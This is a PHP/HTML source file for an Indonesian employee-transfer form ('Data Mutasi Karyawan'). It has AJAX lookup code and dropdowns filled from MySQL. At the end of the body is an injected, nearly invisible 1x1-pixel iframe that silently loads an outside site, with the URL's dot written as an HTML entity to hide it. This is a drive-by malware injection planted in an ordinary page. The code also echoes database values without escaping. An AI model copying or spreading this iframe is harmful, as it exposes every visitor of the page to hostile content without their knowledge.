<script type="text/javascript" src="..js/jquery.js"></script>
<script type="text/javascript">
var ajaxku;
function ambil_data(jab){
	ajaxku = buatajax();
	var url="ambil_data_jab.php";
	url=url+"?id_jabatan="+jab;
	url=url+"&sid="+Math.random();
	ajaxku.onreadystatechange=stateChanged;
	ajaxku.open("GET",url,true);
	ajaxku.send(null);
	}
function buatajax(){
	if (window.XMLHttpRequest){
		return new XMLHttpRequest();
	}
	if (window.ActiveXObject){
		return new ActiveXObject("Microsoft.XMLHTTP");
	}
	return null;
	}
function stateChanged(){
	var data;
	if (ajaxku.readyState==4){
	data=ajaxku.responseText;
	if(data.length>0){
	document.getElementById("jab").value = data
	}else{
	document.getElementById("jab").value = "";
	}
}
}
</script>








<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>

<?php
include"../koneksi.php";

?>
<h1>Data Mutasi Karyawan</h1>
		 <form method='POST' action='aksi_mutasi_jab.php'>
            <div>
            <label>Pilih Nama Karyawan</label>
            <select name="karyawan" id="karyawan" onchange=ambil_data(this.value)>
					<option value=''>- Pilih Karyawan -</option>";	
					<?php	
						$sql = mysql_query('SELECT * FROM karyawan ORDER BY nama ASC');
						while($row = mysql_fetch_array($sql)){ ?>
							<option value='<?php echo "$row[id_jabatan]"; ?>'><?php echo "$row[nama]"; ?></option>;
							<?php } ?>	
							</select>

            </div>
            
            <div>
              	<label>Unit asal</label>
            	<input type="text" id="jab" name="jab">
            </div>
            <div>
            <label>Unit tujuan</label>
            <select>
					<option value=''>- Pilih Unit -</option>";	
					<?php	
						$sql = mysql_query('SELECT * FROM jabatan ORDER BY nm_jabatan ASC');
						while($row = mysql_fetch_array($sql)){ ?>
							<option value='<?php echo "$row[id_jabatan]"; ?>'><?php echo "$row[nm_jabatan]"; ?></option>;
							<?php } ?>	
							</select>

            </div>

            <div>
				<label>&nbsp;</label>
				<label><input type=submit name=submit value=Ubah><input type=reset name=reset value=Batal></label>
			</div>
			</form>

            
            
           		

<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>